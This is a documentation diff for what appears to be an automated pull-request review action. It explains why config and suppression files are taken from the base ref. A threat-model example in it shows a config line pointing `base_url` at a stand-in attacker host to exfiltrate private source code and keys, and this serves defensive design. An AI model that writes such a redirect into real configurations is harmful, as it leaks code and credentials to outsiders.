@@ -45,7 +45,12 @@ Otherwise `base_url: https://attacker.example/v1` in an attacker-authored config
 file redirects a private monorepo's source to their endpoint using your key, and
 a suppression entry filled in with a plausible reason mutes the gate on the
 attacker's own pull request. A pull request touching the config or suppression
-files requires code-owner approval and is itself reviewed using the base version.
+files requires code-owner approval and is itself reviewed using the base
+version. The action enforces this itself: with no `actions/checkout`, it
+fetches the config file named by `config_path` from the base ref before the
+review step ([configuration.md](configuration.md#where-the-config-file-comes-from)),
+never from the pull request head or the merge ref — consumer workflows do not
+hand-roll the fetch and cannot get the ref wrong.
 
 This is also why instruction files are read from the base ref
 ([instructions.md](instructions.md#the-two-deliberate-divergences)): a pull
